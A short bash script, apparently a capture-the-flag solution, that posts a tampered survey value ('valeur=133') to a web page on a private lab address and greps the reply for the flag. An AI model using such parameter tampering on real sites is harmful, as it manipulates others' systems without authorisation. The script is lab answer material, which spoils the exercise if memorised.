#!/bin/bash
curl "http://10.0.2.15/index.php?page=survey#" --data "sujet=2&valeur=133" 2>/dev/null | grep -i flag
